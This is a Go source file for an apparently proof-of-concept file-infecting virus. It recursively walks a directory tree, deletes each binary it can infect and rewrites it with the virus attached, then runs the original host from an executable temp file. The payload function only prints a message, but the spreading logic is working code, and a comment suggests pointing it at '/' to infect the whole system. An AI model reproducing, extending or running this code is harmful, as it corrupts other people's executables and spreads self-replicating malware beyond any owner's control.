package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"

	"./infect"
)

const (
	// BinaryPath is the path that will be infected. It recusively checks binaries
	// from this position, so if you want to infect the system, try using "/"
	BinaryPath = "."
)

func main() {
	virus, host := infect.Unpack(os.Args[0])

	infectBinaries(virus)

	// host will be nil when there is no mark, which means when the binary is
	// initially run, do not try to run (because there's nothing there!)
	if host != nil {
		runHost(host)
	}
}

// malicious is the malicious code to run
func malicious() {
	fmt.Println("I'm infected")
}

// infectBinaries will infect all binaries starting at BinaryPath
func infectBinaries(virus []byte) {
	root, _ := filepath.Abs(filepath.Dir(BinaryPath))

	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if canInfect(path) {
			infectedBinary := infect.Infect(path, virus)
			os.Remove(path)
			ioutil.WriteFile(path, infectedBinary, info.Mode())
		}
		return nil
	})
}

// runHost runs the actual binary if it exists
func runHost(fileData []byte) {
	malicious()

	file, _ := ioutil.TempFile("", "")
	//if err != nil {
	//	panic(err)
	//}

	fileName := file.Name()

	file.Write(fileData)
	file.Close()

	os.Chmod(fileName, 0755)

	stdout, _ := exec.Command(file.Name(), os.Args[1:]...).Output()
	fmt.Println(string(stdout))
}
